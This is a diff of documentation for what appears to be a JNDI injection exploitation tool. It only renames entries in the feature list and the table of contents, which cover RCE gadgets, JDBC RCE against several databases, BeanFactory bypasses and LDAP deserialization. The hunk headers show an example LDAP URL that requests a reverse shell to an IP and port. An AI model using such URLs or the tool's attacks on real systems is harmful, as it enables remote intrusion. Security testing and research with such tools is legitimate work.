@@ -47,9 +47,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
     - SnakeYaml
     - BeanShell
     - MVEL
-    - MLet (detect Java class)
-    - NativeLibLoader (load native library)
-- JDBC RCE (MySQL, PostgreSQL, H2 and Derby)
+    - MLet
+    - NativeLibLoader
+- JDBC RCE (MySQL/PostgreSQL/H2/Derby)
     - Commons DBCP
     - Tomcat DBCP
     - Tomcat JDBC
@@ -68,8 +68,8 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 > Full documentation: [USAGE.en.md](USAGE.en.md)
 
 - [Usage](USAGE.en.md#usage)
-- [Basic](USAGE.en.md#basic)
-- [Notes on JNDI URL](USAGE.en.md#notes-on-jndi-url)
+- [URL Format](USAGE.en.md#url-format)
+- [Basic Functions](USAGE.en.md#basic-functions)
 - [BeanFactory Bypass](USAGE.en.md#beanfactory-bypass)
     - [Tomcat ELProcessor](USAGE.en.md#tomcat-elprocessor)
     - [Groovy ClassLoader/Shell](USAGE.en.md#groovy-classloadershell)
@@ -84,8 +84,8 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
         - [MySQL JDBC Deserialization RCE](USAGE.en.md#mysql-jdbc-deserialization-rce)
         - [MySQL Client Arbitrary File Read](USAGE.en.md#mysql-client-arbitrary-file-read)
     - [PostgreSQL](USAGE.en.md#postgresql)
-    - [H2](USAGE.en.md#h2)
-    - [Derby](USAGE.en.md#derby)
+    - [H2 Database](USAGE.en.md#h2)
+    - [Apache Derby](USAGE.en.md#derby)
         - [Derby SQL RCE](USAGE.en.md#derby-sql-rce)
         - [Derby Master-Slave Replication Deserialization RCE](USAGE.en.md#derby-master-slave-replication-deserialization-rce)
 - [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
